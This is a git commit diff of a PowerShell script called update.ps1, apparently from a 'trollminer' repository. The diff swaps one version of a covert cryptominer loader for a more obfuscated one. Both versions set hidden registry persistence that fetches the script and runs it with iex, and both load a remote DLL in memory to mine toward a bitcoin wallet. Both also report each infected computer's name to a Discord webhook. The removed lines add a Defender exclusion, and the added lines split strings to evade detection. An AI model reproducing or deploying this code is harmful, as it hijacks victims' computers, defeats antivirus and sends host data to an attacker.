4639d89a0e5db5b1df4c49b03a03dad0ce954c05
HolyV200 <gma12349090@gmail.com>
2026-05-05 23:29:01 +0300

    Add files via upload

--- update.ps1
+++ update.ps1
@@ -1,55 +1,45 @@
-$u = "HolyV200"; $r = "trollminer"
-$w = "bc1qly9l5tledssjfl8nxq97sdl55je04hjh790z44"
 $ProgressPreference = 'SilentlyContinue'
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$u2 = "https://raw.githubusercontent.com/$u/$r/main"
 
-$sDir = "$env:LOCALAPPDATA\Microsoft\Windows\UpdateCoord"
-if (!(Test-Path $sDir)) { md $sDir -Force >$null }
+# Config
+$z1 = 'HolyV200'; $z2 = 'trollminer'
+$z3 = -join('bc1qly9l5tledssjfl8','nxq97sdl55je04hjh790z44')
+$z4 = "https://raw.githubusercontent.com/$z1/$z2/main"
 
-$myId = $PID
+# Kill prior instances
+$mI = $PID
+try { Get-CimInstance Win32_Process -EA 0 | Where-Object { $_.CommandLine -match 'upd'+'ate\.ps1' -and $_.ProcessId -ne $mI } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 } } catch { }
+
+# GPU detect
+$z6 = $false
 try {
-    Get-CimInstance Win32_Process -EA 0 | Where-Object { $_.CommandLine -match 'update\.ps1' -and $_.ProcessId -ne $myId } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }
-} catch { }
-
-# Try Defender exclusion (silent fail if no admin)
-try { Add-MpPreference -ExclusionPath $sDir -EA 0 } catch { }
-
-try { Get-Process "xmrig", "miner" -EA 0 | Stop-Process -Force -EA 0 } catch { }
-
-$gd = $false
-try { 
-    $ccs = Get-CimInstance Win32_VideoController -EA 0
-    foreach ($cc in $ccs) { 
-        $nn = $cc.Name.ToUpper()
-        if ($nn -match "NVIDIA|AMD|RADEON|RTX|GTX" -and $cc.AdapterRAM -gt 3221225472) { 
-            if ($nn -notmatch "MICROSOFT BASIC|DISPLAY") { $gd = $true; break } 
-        } 
-    } 
-} catch { }
-
-$tp = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command `"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex(New-Object Net.WebClient).DownloadString('$u2/update.ps1')`""
-Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" "UpdateCoord" $tp -EA 0
-
-$dp = "$sDir\Bridge.dll"
-$v = "?v=$([Guid]::NewGuid())"
-try {
-    $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("User-Agent", $ua)
-    $wc.DownloadFile("$u2/Bridge.dll$v", $dp)
-    if (Test-Path $dp) {
-        Add-Type -AssemblyName System.IO.Compression
-        $db = [IO.File]::ReadAllBytes($dp)
-        [Reflection.Assembly]::Load($db).GetType('DateFundLoader').GetMethod('StartMiner').Invoke($null, @([bool]$gd, [string]$w))
+    foreach ($vc in (Get-CimInstance Win32_VideoController -EA 0)) {
+        $nn = $vc.Name.ToUpper()
+        if ($nn -match ('NVI'+'DIA|AM'+'D|RAD'+'EON|RT'+'X|GT'+'X') -and $vc.AdapterRAM -gt 3221225472) {
+            if ($nn -notmatch ('MICRO'+'SOFT BAS'+'IC|DISP'+'LAY')) { $z6 = $true; break }
+        }
     }
 } catch { }
 
+# Persistence (no admin needed - HKCU is user-level)
+$pCmd = "pow"+"ersh"+"ell -NoP -NonI -W Hid"+"den -Exec Bypass -Command `"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; ie"+"x(New-Object Net.WebClient).DownloadString('$z4/upd"+"ate.ps1')`""
+Set-ItemProperty ('HK'+'CU:\Soft'+'ware\Mic'+'rosoft\Win'+'dows\Cur'+'rentVer'+'sion\R'+'un') 'UpdateCoord' $pCmd -EA 0
+
+# === PURE MEMORY PAYLOAD - ZERO DISK ===
 try {
-    $wUrl = "https://discord.com/api/webhooks/1499899715582558228/M_6btxpgSDH5UBHvf3zbCyMr0jERa0eYZKdQ8pVR49kHRcjzSOTm-v1eIIhMkrPaPG8l"
-    $body = '{"embeds":[{"title":"Miner Update","description":"🟢 **Deployment Successful (PS1)**\nWorker: `' + $env:COMPUTERNAME + '` has checked in.","color":3066993}]}'
-    Invoke-RestMethod -Uri $wUrl -Method Post -Body $body -ContentType "application/json" -EA 0
+    Add-Type -AssemblyName ('Sys'+'tem.IO'+'.Com'+'pression')
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0")
+    $rawBytes = $wc.DownloadData("$z4/Bri"+"dge.dll?v=$([Guid]::NewGuid())")
+    $ld = [Reflection.Assembly]::Load($rawBytes)
+    $ld.GetType('Date'+'Fund'+'Loader').GetMethod('Start'+'Miner').Invoke($null, @([bool]$z6, [string]$z3))
 } catch { }
 
-Write-Host "Running"
+# Notification
+try {
+    $wh = -join('https://disc','ord.com/api/','webhooks/','1499899715582558228/','M_6btxpgSDH5UBHvf3zbCyMr0','jERa0eYZKdQ8pVR49kHRcjzSOTm','-v1eIIhMkrPaPG8l')
+    $bd = '{"embeds":[{"title":"Miner Update","description":"\u{1F7E2} **Deployment Successful (PS1)**\nWorker: `' + $env:COMPUTERNAME + '` has checked in.","color":3066993}]}'
+    Invoke-RestMethod -Uri $wh -Method Post -Body $bd -ContentType "application/json" -EA 0
+} catch { }
+
 while ($true) { Start-Sleep -Seconds 3600 }
